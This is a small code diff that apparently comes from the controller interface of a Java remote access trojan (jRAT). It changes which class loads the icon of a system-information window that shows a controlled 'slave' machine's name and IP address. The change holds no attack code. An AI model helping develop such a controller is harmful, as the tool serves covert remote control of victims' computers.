@@ -1,6 +1,6 @@
 package jrat.controller.ui.frames;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.ui.panels.PanelControlSystemInfo;
 
@@ -14,7 +14,7 @@ public class FrameSystemInfo extends BaseFrame {
 	private JPanel contentPane;
 
 	public FrameSystemInfo(Slave slave) {
-		setIconImage(IconUtils.getIcon("computer").getImage());
+		setIconImage(Resources.getIcon("computer").getImage());
 		setTitle("System Info - " + "[" + slave.getDisplayName() + "] - " + slave.getIP());
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		
